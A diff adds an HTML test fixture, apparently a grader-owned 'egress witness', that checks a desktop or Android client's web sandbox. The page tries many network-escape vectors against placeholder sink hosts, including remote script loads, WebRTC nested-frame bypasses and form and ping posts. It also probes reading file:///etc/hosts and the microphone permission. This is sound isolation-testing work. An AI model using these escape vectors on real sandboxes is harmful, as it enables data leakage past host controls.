@@ -1,0 +1,270 @@
+<!doctype html>
+<html lang="en">
+  <head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1" />
+    <title>Egress witness</title>
+    <style>
+      body {
+        margin: 0;
+        padding: 12px;
+        font-family: system-ui, sans-serif;
+        background: #ffffff;
+        color: #101020;
+      }
+    </style>
+  </head>
+  <body>
+    <h1>Egress witness</h1>
+    <p id="status">Attempting isolated-network vectors</p>
+    <script>
+      // Judge-owned. The oracle replaces the host and port tokens with test-owned sinks reachable
+      // from the client (loopback on desktop, the emulator host alias on Android).
+      // Every vector is attempted; the sink, not this page, decides whether anything escaped.
+      (() => {
+        const sinkHost = "__SINK_HOST__";
+        const sinkPort = "__SINK_PORT__";
+        const udpPort = "__SINK_UDP_PORT__";
+        const base = `http://${sinkHost}:${sinkPort}`;
+        const attempted = [];
+        const failures = {};
+        const privileged = {
+          require: typeof require,
+          process: typeof process,
+          module: typeof module,
+          paseoDesktop: typeof window.paseoDesktop,
+          electron: typeof window.electron,
+          ipcRenderer: typeof window.ipcRenderer,
+          fileFetch: "pending",
+          notification: "pending",
+          media: "pending",
+        };
+        let done = false;
+        function attempt(name, run) {
+          attempted.push(name);
+          try {
+            const result = run();
+            if (result && typeof result.catch === "function") result.catch(() => undefined);
+          } catch (error) {
+            failures[name] = String(error && error.name ? error.name : error);
+          }
+        }
+        const early = {
+          fetch: () => fetch(`${base}/fetch`, { mode: "no-cors" }),
+          xhr: () => {
+            const request = new XMLHttpRequest();
+            request.open("GET", `${base}/xhr`);
+            request.send();
+          },
+          websocket: () => new WebSocket(`ws://${sinkHost}:${sinkPort}/ws`),
+          eventSource: () => new EventSource(`${base}/sse`),
+          image: () => {
+            const image = new Image();
+            image.src = `${base}/img`;
+            document.body.append(image);
+          },
+          cssBackground: () => {
+            const box = document.createElement("div");
+            box.style.cssText = `width:8px;height:8px;background-image:url(${base}/bg)`;
+            document.body.append(box);
+          },
+          cssImport: () => {
+            const style = document.createElement("style");
+            style.textContent = `@import url(${base}/import.css);`;
+            document.head.append(style);
+          },
+          font: () => new FontFace("Sink", `url(${base}/font.woff2)`).load(),
+          svgImage: () =>
+            document.body.insertAdjacentHTML(
+              "beforeend",
+              `<svg width="4" height="4"><image href="${base}/svg" width="4" height="4"/></svg>`,
+            ),
+          audio: () => {
+            const audio = document.createElement("audio");
+            audio.preload = "auto";
+            audio.src = `${base}/audio`;
+            document.body.append(audio);
+            audio.load();
+          },
+          video: () => {
+            const video = document.createElement("video");
+            video.preload = "auto";
+            video.src = `${base}/video`;
+            document.body.append(video);
+            video.load();
+          },
+          script: () => {
+            const script = document.createElement("script");
+            script.src = `${base}/script.js`;
+            document.head.append(script);
+          },
+          stylesheet: () => {
+            const link = document.createElement("link");
+            link.rel = "stylesheet";
+            link.href = `${base}/style.css`;
+            document.head.append(link);
+          },
+          prefetch: () => {
+            const link = document.createElement("link");
+            link.rel = "prefetch";
+            link.href = `${base}/prefetch`;
+            document.head.append(link);
+          },
+          iframe: () => {
+            const frame = document.createElement("iframe");
+            frame.src = `${base}/frame`;
+            document.body.append(frame);
+          },
+          beacon: () => navigator.sendBeacon(`${base}/beacon`, "x"),
+          dynamicImport: () => import(`${base}/module.js`),
+          worker: () => new Worker(`${base}/worker.js`),
+          serviceWorker: () =>
+            navigator.serviceWorker
+              ? navigator.serviceWorker.register(`${base}/sw.js`)
+              : Promise.resolve(),
+          form: () => {
+            const target = document.createElement("iframe");
+            target.name = "formsink";
+            document.body.append(target);
+            const form = document.createElement("form");
+            form.method = "POST";
+            form.action = `${base}/form`;
+            form.target = "formsink";
+            document.body.append(form);
+            form.submit();
+          },
+          preconnect: () => {
+            // Socket-level hints never surface as requests; only host network policy stops them.
+            const link = document.createElement("link");
+            link.rel = "preconnect";
+            link.href = `${base}/preconnect`;
+            document.head.append(link);
+          },
+          ping: () => {
+            // Hyperlink auditing posts to the ping URL when the link is followed in a subframe.
+            const target = document.createElement("iframe");
+            target.name = "pingsink";
+            document.body.append(target);
+            const anchor = document.createElement("a");
+            anchor.href = `${base}/followed`;
+            anchor.target = "pingsink";
+            anchor.setAttribute("ping", `${base}/ping`);
+            document.body.append(anchor);
+            anchor.click();
+          },
+          webTransport: () =>
+            typeof WebTransport === "function"
+              ? new WebTransport(`https://${sinkHost}:${udpPort}/transport`).ready
+              : Promise.resolve(),
+          webrtc: async () => {
+            if (typeof RTCPeerConnection !== "function") return;
+            const connection = new RTCPeerConnection({
+              iceServers: [
+                { urls: `stun:${sinkHost}:${udpPort}` },
+                {
+                  urls: `turn:${sinkHost}:${sinkPort}?transport=tcp`,
+                  username: "witness",
+                  credential: "witness",
+                },
+              ],
+            });
+            connection.createDataChannel("witness");
+            await connection.setLocalDescription(await connection.createOffer());
+          },
+          webrtcNestedFrame: async () => {
+            // A fresh same-origin realm must not restore a removed or unrestricted constructor.
+            // Indexed window access avoids any prototype getter a page-level shim could patch.
+            const frame = document.createElement("iframe");
+            document.body.append(frame);
+            const child = window.frames[window.frames.length - 1];
+            const Constructor = child && child.RTCPeerConnection;
+            if (typeof Constructor !== "function") return;
+            const connection = new Constructor({
+              iceServers: [{ urls: `stun:${sinkHost}:${udpPort}` }],
+            });
+            connection.createDataChannel("witness");
+            await connection.setLocalDescription(await connection.createOffer());
+          },
+          webrtcSrcdocFrame: () => {
+            // The child realm runs its own script; nothing in the parent can intercept it.
+            const frame = document.createElement("iframe");
+            frame.srcdoc = `<script>(async () => { if (typeof RTCPeerConnection !== "function") return; const c = new RTCPeerConnection({ iceServers: [{ urls: "stun:${sinkHost}:${udpPort}" }] }); c.createDataChannel("w"); await c.setLocalDescription(await c.createOffer()); })();<\/script>`;
+            document.body.append(frame);
+          },
+        };
+        // Navigation-like vectors can unload this document if allowed, so they run after
+        // the attempted list is published. The sink observes them regardless.
+        const late = {
+          windowOpen: () => window.open(`${base}/open`, "_blank"),
+          download: () => {
+            const anchor = document.createElement("a");
+            anchor.href = `${base}/download`;
+            anchor.download = "witness.txt";
+            document.body.append(anchor);
+            anchor.click();
+          },
+          topNavigation: () => {
+            window.location.href = `${base}/navigate`;
+          },
+        };
+        window.paseoVisual.register({
+          read() {
+            return {
+              state: {
+                done,
+                attempted: attempted.slice(),
+                lateVectors: Object.keys(late),
+                failures,
+                privileged,
+              },
+              selection: null,
+            };
+          },
+          restore() {},
+          actions: {},
+        });
+        window.addEventListener("load", () => {
+          setTimeout(async () => {
+            for (const [name, run] of Object.entries(early)) attempt(name, run);
+            privileged.fileFetch = await fetch("file:///etc/hosts")
+              .then((response) => response.text())
+              .then(
+                (text) => `readable:${text.length}`,
+                () => "blocked",
+              );
+            privileged.notification =
+              typeof Notification === "function" && Notification.requestPermission
+                ? await Promise.race([
+                    Notification.requestPermission().catch(() => "denied"),
+                    new Promise((resolve) => setTimeout(() => resolve("default"), 3000)),
+                  ])
+                : "unavailable";
+            // Device capture is probed on Android, where the stock WebView can inherit the app's
+            // microphone grant. Desktop permission isolation is covered by the notification probe.
+            privileged.media = !/Android/.test(navigator.userAgent)
+              ? "skipped"
+              : navigator.mediaDevices && navigator.mediaDevices.getUserMedia
+                ? await Promise.race([
+                    navigator.mediaDevices.getUserMedia({ audio: true }).then(
+                      (stream) => {
+                        stream.getTracks().forEach((track) => track.stop());
+                        return "granted";
+                      },
+                      () => "denied",
+                    ),
+                    new Promise((resolve) => setTimeout(() => resolve("denied"), 3000)),
+                  ])
+                : "unavailable";
+            done = true;
+            document.getElementById("status").textContent = `Attempted ${attempted.length}`;
+            document.body.dataset.done = "1";
+            window.paseoVisual.publish();
+            setTimeout(() => {
+              for (const [name, run] of Object.entries(late)) attempt(name, run);
+            }, 400);
+          }, 50);
+        });
+      })();
+    </script>
+  </body>
+</html>
